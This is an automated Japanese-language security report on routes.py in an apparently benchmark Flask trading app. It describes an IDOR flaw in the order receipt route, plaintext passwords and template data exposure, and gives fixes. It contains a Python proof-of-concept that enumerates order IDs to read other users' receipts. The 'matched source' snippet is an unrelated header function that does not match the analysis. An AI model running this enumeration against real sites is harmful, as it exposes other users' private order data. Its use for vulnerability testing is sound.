# Security Analysis: routes.py - HTTP request handlers

## ファイル情報

- **ファイルパス**: `/Users/hikae/ghq/github.com/HikaruEgashira/parsentry-claude-code-integration/benchmarks/benchmarks/XBEN-001-24/app/website/app/routes.py`
- **検出パターン**: HTTP request handlers

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 90**

## 脆弱性タイプ

- `IDOR`

## PAR Policy Analysis

### Principals (データ源)

- **order_id**: Untrusted
  - Context: URLパスパラメータ（/order/<int:order_id>/receipt）から取得されるユーザー入力値
  - Risk Factors: 攻撃者が任意の値を指定可能, 連番IDのため推測が容易, 認可検証なしでリソースアクセスに使用
- **session['user_id']**: SemiTrusted
  - Context: Flaskセッションに保存された認証済みユーザーID
  - Risk Factors: 認証は確認されるが認可には使用されていない
- **request.form['username']**: Untrusted
  - Context: ログインフォームからのユーザー入力
  - Risk Factors: ユーザー列挙攻撃に使用可能, SQLAlchemy ORMで安全に処理されている

### Actions (セキュリティ制御)

- **session.get('user_id') チェック**: Insufficient
  - Function: ユーザーの認証状態を確認する
  - Weaknesses: 認証のみで認可がない, order_idがログインユーザーに属するかの検証がない
  - Bypass Vectors: 正規ユーザーとしてログイン後、order_idを変更
- **Order.query.get(order_id)**: Missing
  - Function: order_idに基づいて注文を取得
  - Weaknesses: ユーザー所有権の検証なし, 任意のorder_idでアクセス可能
  - Bypass Vectors: order_idを1から順に列挙して他ユーザーのデータにアクセス

### Resources (操作対象)

- **Order.query.get()**: High
  - Operation: データベース読み取り - 注文/領収書情報
  - Protection: 認証チェックのみ（認可なし）
- **User.query.filter_by()**: Medium
  - Operation: データベース読み取り - ユーザー情報
  - Protection: SQLAlchemy ORMによるSQLインジェクション防止

### Policy Violations

#### AUTH-001: リソースへのアクセスは認可チェックを必要とする

- **Path**: order_id (URLパラメータ) -> session存在チェックのみ -> Order.query.get() -> receipt.html表示
- **Severity**: high
- **Confidence**: 0.95

#### IDOR-001: オブジェクト参照はリソース所有者との紐付けを検証する必要がある

- **Path**: 攻撃者入力のorder_id -> 所有権検証なし -> 他ユーザーの注文データ漏洩
- **Severity**: high
- **Confidence**: 0.95

## マッチしたソースコード

```code
def add_header(request):
    request.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    request.headers['Pragma'] = 'no-cache'
    request.headers['Expires'] = '0'
    request.headers['Cache-Control'] = 'public, max-age=0'
    return request
```

## 詳細解析

このFlaskアプリケーションには**IDOR（Insecure Direct Object Reference）脆弱性**が存在します。`order_receipt`関数（94-109行目）において、ログイン済みユーザーは任意の`order_id`を指定してリクエストを送信でき、そのorder_idに紐づく注文情報が無条件で返されます。コード内のコメント（99-103行目）でも明示的にこの脆弱性が認識されています。認証チェック（`user_id = session.get('user_id')`）は存在しますが、**認可チェック**（そのorder_idが現在のユーザーに属するかの検証）が欠落しています。また、パスワードのハッシュ化なしでの保存（models.py:8行目）や、password関数でuser_idがテンプレートに公開されている点（routes.py:64行目）も問題です。

## PoC（概念実証コード）

```text
# IDOR脆弱性のPoC（Proof of Concept）
# 攻撃者は正規アカウントでログイン後、order_idを変更することで他ユーザーの領収書を閲覧可能

import requests

# 設定
BASE_URL = 'http://localhost:5000'

# セッションを作成
s = requests.Session()

# 1. 攻撃者のアカウントでログイン
# POSTでusernameを送信
s.post(f'{BASE_URL}/', data={'username': 'attacker_user'})
# パスワードを送信してセッション確立
s.post(f'{BASE_URL}/password/attacker_user', data={'password': 'attacker_password'})

# 2. IDOR攻撃: 他のユーザーのorder_idを列挙して領収書を取得
# 攻撃者は自分のorder_idが例えば10だと仮定し、1-100まで総当たり
for order_id in range(1, 101):
    response = s.get(f'{BASE_URL}/order/{order_id}/receipt')
    if response.status_code == 200 and 'receipt' in response.text.lower():
        print(f'[!] Found accessible receipt at order_id={order_id}')
        print(response.text[:500])  # 領収書の内容を表示
        print('-' * 50)
```

## 修復ガイダンス

### order_receipt関数（routes.py:94-109）

- **Required**: 注文がログインユーザーに属するかの認可チェックを追加
- **Guidance**: Order.query.get()の後に、order.user_id == session['user_id']を検証するか、Order.query.filter_by(id=order_id, user_id=user_id).first()を使用する
- **Priority**: critical

### Orderモデルのクエリ

- **Required**: ユーザーIDと注文IDの両方でフィルタリング
- **Guidance**: order = Order.query.filter_by(id=order_id, user_id=user_id).first() を使用し、orderがNoneの場合は403エラーを返す
- **Priority**: critical

### パスワード保存（models.py）

- **Required**: パスワードのハッシュ化
- **Guidance**: werkzeug.security.generate_password_hashとcheck_password_hashを使用してパスワードを安全に保存・検証する
- **Priority**: high

### password関数テンプレートパラメータ

- **Required**: user_idをテンプレートに渡さない
- **Guidance**: routes.py:64行目のuser_id=user.idパラメータを削除する
- **Priority**: medium

## 解析ノート

このコードはFlaskベースのトレーディングプラットフォームのWebアプリケーションです。主要な脆弱性として、order_receipt関数においてIDOR（Insecure Direct Object Reference）脆弱性が明確に存在します。認証されたユーザーであれば、任意のorder_idを指定して他のユーザーの注文領収書にアクセス可能です。また、パスワードが平文で保存・比較されていることも重大なセキュリティ問題です。password関数ではuser_idをテンプレートに渡しており、情報漏洩のリスクがあります。

